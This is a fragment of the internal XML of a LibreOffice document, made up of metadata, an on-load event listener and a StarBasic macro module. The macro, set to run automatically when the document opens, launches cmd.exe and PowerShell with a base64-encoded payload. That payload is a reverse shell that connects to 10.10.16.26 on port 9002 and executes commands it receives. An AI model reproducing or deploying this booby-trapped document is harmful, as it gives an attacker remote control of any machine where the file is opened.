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fooba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dom:load" xlink:href="vnd.sun.star.script:Standard.foobar.Main?language=Basic&amp;location=document" xlink:type="simple"/>
    </office:event-listeners>
  </office:scripts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07:51:20.096083703</meta:creation-date>
    <dc:date>2024-02-18T07:53:18.288511032</dc:date>
    <meta:editing-duration>PT1M58S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:generator>LibreOffice/24.2.0.3$Linux_X86_64 LibreOffice_project/42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foobar.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="foobar" script:language="StarBasic" script:moduleType="normal">Sub Main

    Shell("cmd.exe /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMgA2ACIALAA5ADAAMAAyACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==")
   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ooba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